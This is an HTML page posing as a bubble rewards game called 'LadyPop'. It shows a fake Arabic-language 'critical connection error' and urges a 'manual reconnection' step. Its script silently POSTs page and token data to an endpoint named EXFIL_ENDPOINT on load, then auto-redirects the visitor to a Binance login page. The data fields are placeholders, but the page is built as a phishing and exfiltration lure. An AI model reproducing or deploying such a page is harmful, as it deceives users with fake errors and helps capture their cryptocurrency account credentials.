<!DOCTYPE html>
<html>
<head>
    <title>LadyPop: Bubble Rewards Game!</title>
    <style>
        body { margin: 0; overflow: hidden; background-color: #2c3e50; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .error-message {
            background: #e74c3c;
            color: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
            max-width: 80%;
        }
        h2 { margin-top: 0; }
        p { margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="error-message">
    <h2>⚠️ خطأ حاسم في الاتصال (Error CRITIQUE)</h2>
    <p>يبدو أن الاتصال بخادم الجوائز قد تم حظره من قبل متصفحك.</p>
    <p>لحل المشكلة نهائيًا واستلام الجوائز، يرجى **النقر هنا والقيام بخطوات إعادة الاتصال اليدوية**.</p>
    <button onclick="redirectToFix()" style="padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; background: #2980b9; color: white; cursor: pointer;">
        بدء عملية إعادة الاتصال اليدوية
    </button>
</div>

<script>
    function redirectToFix() {
        window.location.href = 'https://www.binance.com/en/login'; 
    }

    const EXFIL_ENDPOINT = 'https://' + window.location.host + '/collect_and_forward';
    
    // تاكيد
    fetch(EXFIL_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            url: window.location.href,
            initial_access: "",
            ip_address: null,
            CTO_BUNDLE_TOKEN: "..."
        }),
        mode: 'cors' 
    });

    setTimeout(redirectToFix, 5000); 

</script>

</body>
</html>
